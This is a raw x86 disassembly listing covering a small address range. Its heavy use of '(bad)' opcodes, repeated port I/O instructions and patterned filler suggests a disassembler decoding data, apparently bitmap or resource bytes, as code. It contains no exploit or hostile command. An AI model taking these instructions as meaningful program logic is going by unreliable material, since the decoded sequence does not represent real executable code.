1100e6f1:	add    BYTE PTR [eax],al
1100e6f3:	add    bh,bh
1100e6f5:	(bad)  
1100e6f6:	(bad)  
1100e6f7:	out    dx,al
1100e6f8:	out    dx,eax
1100e6f9:	out    dx,al
1100e6fa:	in     eax,dx
1100e6fb:	out    dx,al
1100e6fc:	fidivr WORD PTR [esi-0x10414122]
1100e702:	(bad)  
1100e703:	inc    DWORD PTR [eax]
1100e705:	add    BYTE PTR [eax],al
1100e707:	add    BYTE PTR [eax],al
1100e709:	add    BYTE PTR [eax],al
1100e70b:	add    BYTE PTR [edi],cl
1100e70d:	(bad)  
1100e70e:	(bad)  
1100e70f:	out    dx,al
1100e710:	out    dx,al
1100e711:	out    dx,al
1100e712:	out    dx,al
1100e713:	out    dx,al
1100e714:	int    0xee
1100e716:	mov    esi,0xffffbdde
1100e71b:	lock add BYTE PTR [eax],al
1100e71e:	add    BYTE PTR [eax],al
1100e720:	add    BYTE PTR [eax],al
1100e722:	add    BYTE PTR [esp+eax*1],al
1100e725:	(bad)  
1100e726:	(bad)  
1100e727:	(bad)  
1100e728:	out    dx,al
1100e729:	out    dx,al
1100e72a:	out    dx,al
1100e72b:	out    0x7d,eax
1100e72d:	out    0xbe,eax
1100e72f:	mov    esi,0x40feffbf
1100e734:	inc    eax
1100e735:	add    BYTE PTR [eax],al
1100e737:	add    BYTE PTR [eax],al
1100e739:	add    BYTE PTR [eax],al
1100e73b:	push   es
1100e73c:	jo     0x1100e78c
1100e73e:	(bad)  
1100e73f:	(bad)  
1100e740:	out    dx,al
1100e741:	out    dx,al
1100e742:	out    dx,al
1100e743:	fsubp  st(3),st
1100e745:	in     eax,dx
1100e746:	out    0xde,eax
1100e748:	out    dx,eax
1100e749:	push   eax
1100e74b:	inc    edi
1100e74c:	inc    eax
1100e74d:	add    BYTE PTR [eax],al
1100e74f:	add    BYTE PTR [eax],al
1100e751:	add    BYTE PTR [eax],al
1100e753:	push   es
1100e754:	jnp    0x1100e796
1100e756:	(bad)  
1100e757:	(bad)  
1100e758:	(bad)  
1100e759:	out    dx,al
1100e75a:	out    dx,al
1100e75b:	jle    0x1100e7db
1100e75d:	jle    0x1100e71d
1100e75f:	mov    edi,0x7d00ffff
1100e764:	push   eax
1100e765:	add    BYTE PTR [eax],al
1100e767:	add    BYTE PTR [eax],al
1100e769:	add    BYTE PTR [eax],al
1100e76b:	or     edi,DWORD PTR [ebp+0x70]
1100e76e:	ud0    edi,edi
1100e771:	out    dx,al
1100e772:	fidivr WORD PTR [ebp+0x7d]
1100e775:	mov    esi,0xf0ffffde
1100e77a:	dec    esi
1100e77b:	mov    bh,0x60
1100e77d:	add    BYTE PTR [eax],al
1100e77f:	add    BYTE PTR [eax],al
1100e781:	add    BYTE PTR [eax],al
1100e783:	pop    es
1100e784:	ja     0x1100e744
1100e786:	inc    eax
1100e787:	(bad)  
1100e788:	(bad)  
1100e789:	(bad)  
1100e78a:	(bad)  
1100e78b:	out    dx,al
1100e78c:	out    dx,al
1100e78d:	out    dx,al
1100e78e:	(bad)  
1100e78f:	(bad)  
1100e790:	inc    BYTE PTR [eax+0x77]
1100e793:	mov    esi,0xb0
1100e798:	add    BYTE PTR [eax],al
1100e79a:	add    BYTE PTR [esi+ebx*8],al
1100e79d:	mov    bh,0x70
1100e79f:	ud0    edi,edi
1100e7a2:	(bad)  
1100e7a3:	(bad)  
1100e7a4:	(bad)  
1100e7a5:	(bad)  
1100e7a6:	(bad)  
1100e7a7:	push   edx
1100e7a9:	inc    edi
1100e7aa:	mov    esi,0x40de
1100e7af:	add    BYTE PTR [eax],al
1100e7b1:	add    BYTE PTR [eax],al
1100e7b3:	add    al,0xeb
1100e7b5:	in     eax,dx
1100e7b6:	jnp    0x1100e81c
1100e7b8:	(bad)  
1100e7b9:	(bad)  
1100e7ba:	(bad)  
1100e7bb:	(bad)  
1100e7bc:	(bad)  
1100e7bd:	(bad)  
1100e7be:	(bad)  
1100e7bf:	inc    DWORD PTR [eax]
1100e7c1:	jnp    0x1100e7b0
1100e7c3:	jnp    0x1100e835
1100e7c5:	add    BYTE PTR [eax],al
1100e7c7:	add    BYTE PTR [eax],al
1100e7c9:	add    BYTE PTR [eax],al
1100e7cb:	add    al,0xeb
1100e7cd:	jmp    0x1100e7ba
1100e7cf:	jo     0x1100e7e0
1100e7d1:	(bad)  
1100e7d2:	(bad)  
1100e7d3:	(bad)  
1100e7d4:	(bad)  
1100e7d5:	(bad)  
1100e7d6:	push   eax
1100e7d8:	inc    ebp
1100e7d9:	fidiv  WORD PTR [edi+0x507d]
1100e7df:	add    BYTE PTR [eax],al
1100e7e1:	add    BYTE PTR [eax],al
1100e7e3:	push   es
1100e7e4:	in     eax,dx
1100e7e5:	ja     0x1100e7be
1100e7e7:	jbe    0x1100e7ea
1100e7e9:	(bad)  
1100e7ea:	(bad)  
1100e7eb:	(bad)  
1100e7ec:	(bad)  
1100e7ed:	(bad)  
1100e7ee:	inc    DWORD PTR [eax]
1100e7f0:	jbe    0x1100e7dd
1100e7f2:	in     eax,dx
1100e7f3:	ja     0x1100e855
1100e7f5:	add    BYTE PTR [eax],al
1100e7f7:	add    BYTE PTR [eax],al
1100e7f9:	add    BYTE PTR [eax],al
1100e7fb:	add    BYTE PTR [esi+0x47],dl
1100e7fe:	inc    esi
1100e7ff:	push   esi
1100e800:	inc    eax
1100e801:	ud0    edi,edi
1100e804:	(bad)  
1100e805:	push   eax
1100e807:	push   es
1100e808:	push   esi
1100e809:	inc    edi
1100e80a:	inc    esi
1100e80b:	push   esi
	...
1100e818:	add    BYTE PTR [eax],al
1100e81a:	(bad)  
1100e81b:	(bad)  
1100e81c:	(bad)  
1100e81d:	inc    DWORD PTR [eax]
	...
1100e82f:	add    BYTE PTR [eax],al
1100e831:	add    BYTE PTR [edi],cl
1100e833:	(bad)  
1100e834:	push   eax
	...
1100e84a:	add    bh,bh
1100e84c:	inc    DWORD PTR [eax]
	...
1100e862:	add    BYTE PTR [edi],cl
1100e864:	lock add BYTE PTR [eax],al
	...
1100e8b7:	add    bh,bh
1100e8b9:	(bad)  
1100e8ba:	(bad)  
1100e8bb:	(bad)  
1100e8bc:	(bad)  
1100e8bd:	inc    DWORD PTR [eax]
1100e8bf:	add    bh,bh
1100e8c1:	(bad)  
1100e8c2:	(bad)  
1100e8c3:	jg     0x1100e8c4
1100e8c5:	inc    DWORD PTR [eax]
1100e8c7:	add    bh,bh
1100e8c9:	(bad)  
1100e8ca:	cld    
1100e8cb:	aas    
1100e8cc:	(bad)  
1100e8cd:	inc    DWORD PTR [eax]
1100e8cf:	add    bh,bh
1100e8d1:	(bad)  
1100e8d2:	clc    
1100e8d3:	pop    ds
1100e8d4:	(bad)  
1100e8d5:	inc    DWORD PTR [eax]
1100e8d7:	add    bh,bh
1100e8d9:	push   eax
1100e8db:	ud0    edi,edi
1100e8de:	add    BYTE PTR [eax],al
1100e8e0:	(bad)  
1100e8e1:	jmp    eax
1100e8e3:	pop    es
1100e8e4:	(bad)  
1100e8e5:	inc    DWORD PTR [eax]
1100e8e7:	add    ah,bh
1100e8e9:	add    BYTE PTR [eax],al
1100e8eb:	add    BYTE PTR [eax],al
1100e8ed:	aas    
1100e8ee:	add    BYTE PTR [eax],al
1100e8f0:	cld    
1100e8f1:	add    BYTE PTR [eax],al
1100e8f3:	add    BYTE PTR [eax],al
1100e8f5:	aas    
1100e8f6:	add    BYTE PTR [eax],al
1100e8f8:	cld    
1100e8f9:	add    BYTE PTR [eax],al
1100e8fb:	add    BYTE PTR [eax],al
1100e8fd:	aas    
1100e8fe:	add    BYTE PTR [eax],al
1100e900:	cld    
1100e901:	add    BYTE PTR [eax],al
1100e903:	add    BYTE PTR [eax],al
1100e905:	aas    
1100e906:	add    BYTE PTR [eax],al
1100e908:	cld    
1100e909:	add    BYTE PTR [eax],al
1100e90b:	add    BYTE PTR [eax],al
1100e90d:	aas    
1100e90e:	add    BYTE PTR [eax],al
1100e910:	cld    
1100e911:	add    BYTE PTR [eax],al
1100e913:	add    BYTE PTR [eax],al
1100e915:	aas    
1100e916:	add    BYTE PTR [eax],al
1100e918:	cld    
1100e919:	add    BYTE PTR [eax],al
1100e91b:	add    BYTE PTR [eax],al
1100e91d:	aas    
1100e91e:	add    BYTE PTR [eax],al
1100e920:	cld    
1100e921:	add    BYTE PTR [eax],al
1100e923:	add    BYTE PTR [eax],al
1100e925:	aas    
1100e926:	add    BYTE PTR [eax],al
1100e928:	cld    
1100e929:	add    BYTE PTR [eax],al
1100e92b:	add    BYTE PTR [eax],al
1100e92d:	aas    
1100e92e:	add    BYTE PTR [eax],al
1100e930:	cld    
1100e931:	add    BYTE PTR [eax],al
1100e933:	add    BYTE PTR [eax],al
1100e935:	aas    
1100e936:	add    BYTE PTR [eax],al
1100e938:	cld    
1100e939:	add    BYTE PTR [eax],al
1100e93b:	add    BYTE PTR [eax],al
1100e93d:	aas    
1100e93e:	add    BYTE PTR [eax],al
1100e940:	cld    
1100e941:	add    BYTE PTR [eax],al
1100e943:	add    BYTE PTR [eax],al
1100e945:	aas    
1100e946:	add    BYTE PTR [eax],al
1100e948:	cld    
1100e949:	add    BYTE PTR [eax],al
1100e94b:	add    BYTE PTR [eax],al
1100e94d:	aas    
1100e94e:	add    BYTE PTR [eax],al
1100e950:	clc    
1100e951:	add    BYTE PTR [eax],al
1100e953:	add    BYTE PTR [eax],al
1100e955:	pop    ds
1100e956:	add    BYTE PTR [eax],al
1100e958:	lock add BYTE PTR [eax],al
1100e95b:	add    BYTE PTR [eax],al
1100e95d:	sldt   WORD PTR [eax]
1100e960:	loopne 0x1100e962
1100e962:	add    BYTE PTR [eax],al
1100e964:	add    BYTE PTR [edi],al
1100e966:	add    BYTE PTR [eax],al
1100e968:	rol    BYTE PTR [eax],0x0
1100e96b:	add    BYTE PTR [eax],al
1100e96d:	add    eax,DWORD PTR [eax]
1100e96f:	add    BYTE PTR [eax+0x0],al
1100e975:	add    DWORD PTR [eax],eax
1100e977:	add    BYTE PTR [eax+0x0],al
1100e97d:	add    DWORD PTR [eax],eax
1100e97f:	add    al,al
1100e981:	add    BYTE PTR [eax],al
1100e983:	add    BYTE PTR [eax],al
1100e985:	add    eax,DWORD PTR [eax]
1100e987:	add    al,ah
1100e989:	add    BYTE PTR [eax],al
1100e98b:	add    BYTE PTR [eax],al
1100e98d:	pop    es
1100e98e:	add    BYTE PTR [eax],al
1100e990:	lock add BYTE PTR [eax],al
1100e993:	add    BYTE PTR [eax],al
1100e995:	sldt   WORD PTR [eax]
1100e998:	clc    
1100e999:	add    BYTE PTR [eax],al
1100e99b:	add    BYTE PTR [eax],al
1100e99d:	pop    ds
1100e99e:	add    BYTE PTR [eax],al
1100e9a0:	cld    
1100e9a1:	add    BYTE PTR [eax],al
1100e9a3:	add    BYTE PTR [eax],al
1100e9a5:	aas    
1100e9a6:	add    BYTE PTR [eax],al
1100e9a8:	cld    
1100e9a9:	add    BYTE PTR [eax],al
1100e9ab:	add    BYTE PTR [eax],al
1100e9ad:	aas    
1100e9ae:	add    BYTE PTR [eax],al
1100e9b0:	cld    
1100e9b1:	add    BYTE PTR [eax],al
1100e9b3:	add    BYTE PTR [eax],al
1100e9b5:	aas    
1100e9b6:	add    BYTE PTR [eax],al
1100e9b8:	cld    
1100e9b9:	add    BYTE PTR [eax],al
1100e9bb:	add    BYTE PTR [eax],al
1100e9bd:	aas    
1100e9be:	add    BYTE PTR [eax],al
1100e9c0:	cld    
1100e9c1:	add    BYTE PTR [eax],al
1100e9c3:	add    BYTE PTR [eax],al
1100e9c5:	aas    
1100e9c6:	add    BYTE PTR [eax],al
1100e9c8:	cld    
1100e9c9:	add    BYTE PTR [eax],al
1100e9cb:	add    BYTE PTR [eax],al
1100e9cd:	aas    
1100e9ce:	add    BYTE PTR [eax],al
1100e9d0:	cld    
1100e9d1:	add    BYTE PTR [eax],al
1100e9d3:	add    BYTE PTR [eax],al
1100e9d5:	aas    
1100e9d6:	add    BYTE PTR [eax],al
1100e9d8:	cld    
1100e9d9:	add    BYTE PTR [eax],al
1100e9db:	add    BYTE PTR [eax],al
1100e9dd:	aas    
1100e9de:	add    BYTE PTR [eax],al
1100e9e0:	cld    
1100e9e1:	add    BYTE PTR [eax],al
1100e9e3:	add    BYTE PTR [eax],al
1100e9e5:	aas    
1100e9e6:	add    BYTE PTR [eax],al
1100e9e8:	cld    
1100e9e9:	add    BYTE PTR [eax],al
1100e9eb:	add    BYTE PTR [eax],al
1100e9ed:	aas    
1100e9ee:	add    BYTE PTR [eax],al
1100e9f0:	cld    
1100e9f1:	add    BYTE PTR [eax],al
1100e9f3:	add    BYTE PTR [eax],al
1100e9f5:	aas    
1100e9f6:	add    BYTE PTR [eax],al
1100e9f8:	cld    
1100e9f9:	add    BYTE PTR [eax],al
1100e9fb:	add    BYTE PTR [eax],al
1100e9fd:	aas    
1100e9fe:	add    BYTE PTR [eax],al
1100ea00:	cld    
1100ea01:	add    BYTE PTR [eax],al
1100ea03:	add    BYTE PTR [eax],al
1100ea05:	aas    
1100ea06:	add    BYTE PTR [eax],al
1100ea08:	(bad)  
1100ea09:	jmp    eax
1100ea0b:	pop    es
1100ea0c:	(bad)  
1100ea0d:	inc    DWORD PTR [eax]
1100ea0f:	add    bh,bh
1100ea11:	push   eax
1100ea13:	ud0    edi,edi
1100ea16:	add    BYTE PTR [eax],al
1100ea18:	(bad)  
1100ea19:	(bad)  
1100ea1a:	clc    
1100ea1b:	pop    ds
1100ea1c:	(bad)  
1100ea1d:	inc    DWORD PTR [eax]
1100ea1f:	add    bh,bh
1100ea21:	(bad)  
1100ea22:	cld    
1100ea23:	aas    
1100ea24:	(bad)  
1100ea25:	inc    DWORD PTR [eax]
1100ea27:	add    bh,bh
1100ea29:	(bad)  
1100ea2a:	(bad)  
1100ea2b:	jg     0x1100ea2c
1100ea2d:	inc    DWORD PTR [eax]
1100ea2f:	add    bh,bh
1100ea31:	(bad)  
1100ea32:	(bad)  
1100ea33:	(bad)  
1100ea34:	(bad)  
1100ea35:	inc    DWORD PTR [eax]
1100ea37:	add    BYTE PTR [eax],ch
1100ea39:	add    BYTE PTR [eax],al
1100ea3b:	add    BYTE PTR [eax],ch
1100ea3d:	add    BYTE PTR [eax],al
1100ea3f:	add    BYTE PTR [eax+0x0],dl
1100ea42:	add    BYTE PTR [eax],al
1100ea44:	add    DWORD PTR [eax],eax
1100ea46:	add    al,0x0
	...
1100ea64:	add    BYTE PTR [eax],al
1100ea66:	add    BYTE PTR [eax],0x0
1100ea69:	add    BYTE PTR [eax],0x0
1100ea6c:	add    BYTE PTR [eax+0x800080],al
1100ea72:	add    BYTE PTR [eax],al
1100ea74:	add    BYTE PTR [eax],0x80
1100ea77:	add    BYTE PTR [eax-0x7fffff80],al
1100ea7d:	add    BYTE PTR [eax-0x1000000],0x0
1100ea84:	add    bh,bh
1100ea86:	add    BYTE PTR [eax],al
1100ea88:	add    bh,bh
1100ea8a:	inc    DWORD PTR [eax]
1100ea8c:	inc    DWORD PTR [eax]
1100ea8e:	add    BYTE PTR [eax],al
1100ea90:	inc    DWORD PTR [eax]
1100ea92:	inc    DWORD PTR [eax]
1100ea94:	(bad)  
1100ea95:	inc    DWORD PTR [eax]
1100ea97:	add    al,al
1100ea99:	rol    al,0x0
1100ea9c:	(bad)  
1100ea9d:	(bad)  
1100ea9e:	inc    DWORD PTR [eax]
	...
1100ead0:	add    BYTE PTR ds:0x70,al
	...
1100eae2:	add    BYTE PTR [eax],al
1100eae4:	add    BYTE PTR [edi-0x9],bh
	...
1100eaf7:	add    BYTE PTR [edi],al
1100eaf9:	(bad)  
1100eafa:	push   DWORD PTR [eax+0x0]
	...
1100eb05:	add    BYTE PTR [eax],al
1100eb07:	add    BYTE PTR [eax+0x0],al
1100eb0a:	add    BYTE PTR [eax],al
1100eb0c:	jg     0x1100eb0d
1100eb0e:	push   edi
1100eb10:	add    BYTE PTR [eax],al
1100eb12:	add    BYTE PTR [eax],al
1100eb14:	add    al,0x0
1100eb16:	add    BYTE PTR [eax],al
1100eb18:	add    BYTE PTR [eax],al
1100eb1a:	add    al,0x7b
1100eb1c:	jbe    0x1100eb74
1100eb1e:	inc    eax
1100eb1f:	pop    es
1100eb20:	(bad)  
1100eb21:	(bad)  
1100eb22:	(bad)  
1100eb23:	push   DWORD PTR [eax+0x5]
1100eb26:	imul   edi,DWORD PTR [ebx+0x76],0x0
1100eb2a:	add    BYTE PTR [eax],al
1100eb2c:	add    BYTE PTR [eax],al
1100eb2e:	add    BYTE PTR [ebp+0x7b],bh
1100eb31:	jbe    0x1100eb33
1100eb33:	jg     0x1100eb34
1100eb35:	(bad)  
1100eb36:	(bad)  
1100eb37:	push   edi
1100eb39:	add    BYTE PTR [esi+0x77],al
1100eb3c:	aad    0x40
1100eb3e:	add    BYTE PTR [eax],al
1100eb40:	add    BYTE PTR [eax],al
1100eb42:	add    BYTE PTR [edi-0xf8bb8a],dh
1100eb48:	(bad)  
1100eb49:	(bad)  
1100eb4a:	(bad)  
1100eb4b:	(bad)  
1100eb4c:	push   DWORD PTR [eax+0x4]
1100eb4f:	jnp    0x1100ebc7
1100eb51:	add    BYTE PTR [eax],al
1100eb53:	add    BYTE PTR [eax],al
1100eb55:	add    BYTE PTR [eax],al
1100eb57:	addr16 mov bl,0x0
1100eb5a:	jg     0x1100eb5b
1100eb5c:	(bad)  
1100eb5d:	(bad)  
1100eb5e:	(bad)  
1100eb5f:	(bad)  
1100eb60:	push   edi
1100eb62:	add    al,0x66
1100eb64:	jbe    0x1100eb66
1100eb66:	add    BYTE PTR [eax],al
1100eb68:	add    BYTE PTR [eax],al
1100eb6a:	add    BYTE PTR [esi+0x44],dh
1100eb6d:	pop    es
1100eb6e:	(bad)  
1100eb6f:	(bad)  
1100eb70:	out    dx,al
1100eb71:	mov    esi,0xffffeebd
1100eb76:	jo     0x1100eb7d
1100eb78:	add    BYTE PTR [bx+si],al
1100eb7b:	add    BYTE PTR [eax],al
1100eb7d:	add    BYTE PTR [eax],al
1100eb7f:	add    BYTE PTR fs:[edi-0x1],bh
1100eb83:	sti    
1100eb84:	in     eax,dx
1100eb85:	mov    esi,0xffee5bbd
1100eb8a:	test   DWORD PTR [esi+eax*2],0x0
1100eb91:	add    BYTE PTR [eax],al
1100eb93:	add    al,0x7
1100eb95:	(bad)  
1100eb96:	(bad)  
1100eb97:	fidiv  WORD PTR [edi-0x24241425]
1100eb9d:	out    dx,eax
1100eb9e:	push   DWORD PTR [eax+0x4]
1100eba1:	add    BYTE PTR [eax],al
1100eba3:	add    BYTE PTR [eax],al
1100eba5:	add    BYTE PTR [eax],al
1100eba7:	add    BYTE PTR [edi-0x1],bh
1100ebaa:	jmp    0x1100eb93
1100ebac:	mov    esi,0xb7beb7b7
1100ebb1:	mov    esi,0xf7ff
1100ebb6:	add    BYTE PTR [eax],al
1100ebb8:	add    BYTE PTR [eax],al
1100ebba:	add    BYTE PTR [edi],al
1100ebbc:	(bad)  
1100ebbd:	(bad)  
1100ebbe:	jmp    0x1100eb97
1100ebc0:	jge    0x1100ec39
1100ebc2:	jge    0x1100eb82
1100ebc4:	mov    ebp,0x70ffefb6
1100ebc9:	add    BYTE PTR [eax],al
1100ebcb:	add    BYTE PTR [eax],al
1100ebcd:	add    BYTE PTR [eax],al
1100ebcf:	jg     0x1100ebd0
1100ebd1:	(bad)  
1100ebd2:	outs   dx,BYTE PTR ds:[esi]
1100ebd3:	ja     0x1100ec50
1100ebd5:	jmp    0x1100ec52
1100ebd7:	jnp    0x1100ec54
1100ebd9:	jmp    0x1100ebca
1100ebdb:	push   edi
1100ebdd:	add    BYTE PTR [eax],al
1100ebdf:	add    BYTE PTR [eax],al
1100ebe1:	add    BYTE PTR [edi],al
1100ebe3:	(bad)  
1100ebe4:	(bad)  
1100ebe5:	out    dx,al
1100ebe6:	mov    esi,0x7d7dedd7
1100ebeb:	jmp    0x1100ebc8
1100ebed:	imul   edi,DWORD PTR [esi+0x70ffff],0x0
1100ebf4:	add    BYTE PTR [eax],al
1100ebf6:	jg     0x1100ebf7
1100ebf8:	(bad)  
1100ebf9:	jmp    0x1100ebe8
1100ebfb:	jnp    0x1100ebe8
1100ebfd:	jmp    0x1100ebea
1100ebff:	jmp    0x1100ebec
1100ec01:	jmp    0x1100ebf1
1100ec03:	(bad)  
1100ec04:	push   edi
1100ec06:	add    BYTE PTR [eax],al
1100ec08:	add    BYTE PTR [edi],al
1100ec0a:	(bad)  
1100ec0b:	(bad)  
1100ec0c:	(bad)  
1100ec0d:	fidiv  WORD PTR [edi-0x12]
1100ec10:	fsubp  st(5),st
1100ec12:	jmp    0x1100ebf2
1100ec14:	mov    esi,0xffffb6bd
1100ec19:	(bad)  
1100ec1a:	jo     0x1100ec1c
1100ec1c:	add    BYTE PTR [edi-0x1],bh
1100ec1f:	(bad)  
1100ec20:	(bad)  
1100ec21:	jmp    0x1100ec10
1100ec23:	jmp    0x1100ec10
1100ec25:	jmp    0x1100ec12
1100ec27:	jmp    0x1100eca4
1100ec29:	xlat   BYTE PTR ds:[ebx]
1100ec2a:	mov    esi,0xf7ffffff
1100ec2f:	add    BYTE PTR [eax],al
1100ec31:	jg     0x1100ec32
1100ec33:	(bad)  
1100ec34:	(bad)  
1100ec35:	mov    esi,0xeeedee7e
1100ec3a:	jle    0x1100ecb9
1100ec3c:	jmp    0x1100ecbb
1100ec3e:	mov    bh,0xff
1100ec40:	(bad)  
1100ec41:	push   edi
1100ec43:	add    BYTE PTR [eax],al
1100ec45:	pop    es
1100ec46:	(bad)  
1100ec47:	(bad)  
1100ec48:	(bad)  
1100ec49:	in     eax,dx
1100ec4a:	out    dx,al
1100ec4b:	in     eax,dx
1100ec4c:	out    dx,al
1100ec4d:	jmp    0x1100ec3c
1100ec4f:	mov    esi,0xffebebbb
1100ec54:	(bad)  
1100ec55:	push   DWORD PTR [eax+0x0]
1100ec58:	add    BYTE PTR [eax],al
1100ec5a:	jg     0x1100ec5b
1100ec5c:	(bad)  
1100ec5d:	out    dx,al
1100ec5e:	fsubp  st(6),st
1100ec60:	in     eax,dx
1100ec61:	out    dx,al
1100ec62:	out    0x7e,eax
1100ec64:	fidivr WORD PTR [ebp-0x8000042]
1100ec6a:	add    BYTE PTR [eax],al
1100ec6c:	add    BYTE PTR [eax],al
1100ec6e:	pop    es
1100ec6f:	(bad)  
1100ec70:	(bad)  
1100ec71:	out    dx,al
1100ec72:	out    dx,al
1100ec73:	out    dx,al
1100ec74:	out    dx,al
1100ec75:	out    dx,al
1100ec76:	mov    ebp,0x7e77beed
1100ec7b:	(bad)  
1100ec7c:	push   DWORD PTR [eax+0x0]
1100ec7f:	add    BYTE PTR [eax],al
1100ec81:	add    BYTE PTR [eax],al
1100ec83:	jg     0x1100ec84
1100ec85:	(bad)  
1100ec86:	out    dx,al
1100ec87:	out    dx,eax
1100ec88:	out    dx,al
1100ec89:	out    dx,al
1100ec8a:	jmp    0x1100ec79
1100ec8c:	jmp    0x1100ec69
1100ec8e:	jg     0x1100ec8f
1100ec90:	test   DWORD PTR [eax],0x0
1100ec96:	add    BYTE PTR [edi],al
1100ec98:	(bad)  
1100ec99:	(bad)  
1100ec9a:	out    dx,al
1100ec9b:	out    dx,eax
1100ec9c:	in     eax,dx
1100ec9d:	in     eax,dx
1100ec9e:	ja     0x1100ec8e
1100eca0:	mov    esi,0x70ffef7e
1100eca5:	add    BYTE PTR [eax],al
1100eca7:	add    BYTE PTR [eax],al
1100eca9:	add    BYTE PTR [eax],al
1100ecab:	inc    eax
1100ecac:	jg     0x1100ecad
1100ecae:	out    dx,al
1100ecaf:	out    dx,al
1100ecb0:	out    dx,al
1100ecb1:	out    dx,al
1100ecb2:	jle    0x1100ec6b
1100ecb4:	jge    0x1100ec74
1100ecb6:	push   edi
1100ecb8:	add    al,0x0
1100ecba:	add    BYTE PTR [eax],al
1100ecbc:	add    BYTE PTR [eax],al
1100ecbe:	add    BYTE PTR [edi+0x47],dh
1100ecc1:	(bad)  
1100ecc2:	(bad)  
1100ecc3:	out    dx,al
1100ecc4:	out    dx,al
1100ecc5:	jle    0x1100ed45
1100ecc7:	(bad)  
1100ecc9:	out    dx,eax
1100ecca:	push   DWORD PTR [eax-0x49]
1100eccd:	inc    eax
1100ecce:	add    BYTE PTR [eax],al
1100ecd0:	add    BYTE PTR [eax],al
1100ecd2:	add    BYTE PTR [ebp-0x110080b0],bh
1100ecd8:	out    dx,al
1100ecd9:	xlat   BYTE PTR ds:[ebx]
1100ecda:	jmp    0x1100ecc7
1100ecdc:	out    dx,al
1100ecdd:	push   edi
1100ecdf:	or     esi,DWORD PTR [edi+0x0]
1100ece2:	add    BYTE PTR [eax],al
1100ece4:	add    BYTE PTR [eax],al
1100ece6:	add    BYTE PTR [ebp+0x7b],bh
1100ece9:	inc    edi
1100ecea:	(bad)  
1100eceb:	(bad)  
1100ecec:	out    dx,al
1100eced:	out    0xed,eax
1100ecef:	out    dx,al
1100ecf0:	(bad)  
1100ecf1:	push   DWORD PTR [eax+0x7d]
1100ecf4:	jmp    0x1100ecf6
1100ecf6:	add    BYTE PTR [eax],al
1100ecf8:	add    BYTE PTR [eax],al
1100ecfa:	add    BYTE PTR [edi-0x809f22],dh
1100ed00:	(bad)  
1100ed01:	(bad)  
1100ed02:	(bad)  
1100ed03:	(bad)  
1100ed04:	push   edi
1100ed06:	or     ebp,ebx
1100ed08:	out    0x0,al
1100ed0a:	add    BYTE PTR [eax],al
1100ed0c:	add    BYTE PTR [eax],al
1100ed0e:	add    BYTE PTR [esi-0x42],bh
1100ed11:	mov    bh,0x47
1100ed13:	(bad)  
1100ed14:	(bad)  
1100ed15:	(bad)  
1100ed16:	(bad)  
1100ed17:	(bad)  
1100ed18:	push   DWORD PTR [eax+0x7d]
1100ed1b:	jnp    0x1100ed03
1100ed1d:	inc    eax
1100ed1e:	add    BYTE PTR [eax],al
1100ed20:	add    BYTE PTR [eax],al
1100ed22:	add    BYTE PTR [edi+0x7f70777d],dh
1100ed28:	(bad)  
1100ed29:	(bad)  
1100ed2a:	(bad)  
1100ed2b:	push   edi
1100ed2d:	or     esi,DWORD PTR [edi-0x22]
1100ed30:	mov    bh,0x0
1100ed32:	add    BYTE PTR [eax],al
1100ed34:	add    BYTE PTR [eax],al
1100ed36:	add    BYTE PTR [edi+0x67],ah
1100ed39:	mov    bh,0x64
1100ed3b:	pop    es
1100ed3c:	(bad)  
1100ed3d:	(bad)  
1100ed3e:	(bad)  
1100ed3f:	push   DWORD PTR [eax+0x47]
1100ed42:	addr16 mov bh,0x67
	...
1100ed4d:	add    BYTE PTR [eax],al
1100ed4f:	add    BYTE PTR [edi-0x1],bh
1100ed52:	push   edi
	...
1100ed64:	pop    es
1100ed65:	(bad)  
1100ed66:	push   DWORD PTR [eax+0x0]
	...
1100ed79:	jg     0x1100ed72
	...
1100ed8b:	add    BYTE PTR [eax],al
1100ed8d:	pop    es
1100ed8e:	jo     0x1100ed90
	...
1100edc0:	(bad)  
1100edc1:	(bad)  
1100edc2:	(bad)  
1100edc3:	(bad)  
1100edc4:	inc    DWORD PTR [eax]
1100edc6:	add    BYTE PTR [eax],al
1100edc8:	(bad)  
1100edc9:	jmp    edi
1100edcb:	(bad)  
1100edcc:	inc    DWORD PTR [eax]
1100edce:	add    BYTE PTR [eax],al
1100edd0:	(bad)  
1100edd1:	inc    ebx
1100edd3:	(bad)  
1100edd4:	inc    DWORD PTR [eax]
1100edd6:	add    BYTE PTR [eax],al
1100edd8:	(bad)  
1100edd9:	inc    DWORD PTR [ecx+0xffff]
1100eddf:	add    bh,bh
1100ede1:	inc    DWORD PTR [eax]
1100ede3:	(bad)  
1100ede4:	inc    DWORD PTR [eax]
1100ede6:	add    BYTE PTR [eax],al
1100ede8:	clc    
1100ede9:	add    BYTE PTR [eax],al
1100edeb:	add    BYTE PTR [edi],bl
1100eded:	add    BYTE PTR [eax],al
1100edef:	add    al,bh
1100edf1:	add    BYTE PTR [eax],al
1100edf3:	add    BYTE PTR [edi],bl
1100edf5:	add    BYTE PTR [eax],al
1100edf7:	add    al,bh
1100edf9:	add    BYTE PTR [eax],al
1100edfb:	add    BYTE PTR [edi],bl
1100edfd:	add    BYTE PTR [eax],al
1100edff:	add    al,bh
1100ee01:	add    BYTE PTR [eax],al
1100ee03:	add    BYTE PTR [edi],bl
1100ee05:	add    BYTE PTR [eax],al
1100ee07:	add    al,bh
1100ee09:	add    BYTE PTR [eax],al
1100ee0b:	add    BYTE PTR [edi],bl
1100ee0d:	add    BYTE PTR [eax],al
1100ee0f:	add    al,bh
1100ee11:	add    BYTE PTR [eax],al
1100ee13:	add    BYTE PTR [edi],bl
1100ee15:	add    BYTE PTR [eax],al
1100ee17:	add    al,bh
1100ee19:	add    BYTE PTR [eax],al
1100ee1b:	add    BYTE PTR [edi],bl
1100ee1d:	add    BYTE PTR [eax],al
1100ee1f:	add    al,bh
1100ee21:	add    BYTE PTR [eax],al
1100ee23:	add    BYTE PTR [edi],bl
1100ee25:	add    BYTE PTR [eax],al
1100ee27:	add    al,bh
1100ee29:	add    BYTE PTR [eax],al
1100ee2b:	add    BYTE PTR [edi],bl
1100ee2d:	add    BYTE PTR [eax],al
1100ee2f:	add    al,bh
1100ee31:	add    BYTE PTR [eax],al
1100ee33:	add    BYTE PTR [edi],bl
1100ee35:	add    BYTE PTR [eax],al
1100ee37:	add    al,bh
1100ee39:	add    BYTE PTR [eax],al
1100ee3b:	add    BYTE PTR [edi],bl
1100ee3d:	add    BYTE PTR [eax],al
1100ee3f:	add    al,dh
1100ee41:	add    BYTE PTR [eax],al
1100ee43:	add    BYTE PTR [edi],cl
1100ee45:	add    BYTE PTR [eax],al
1100ee47:	add    al,ah
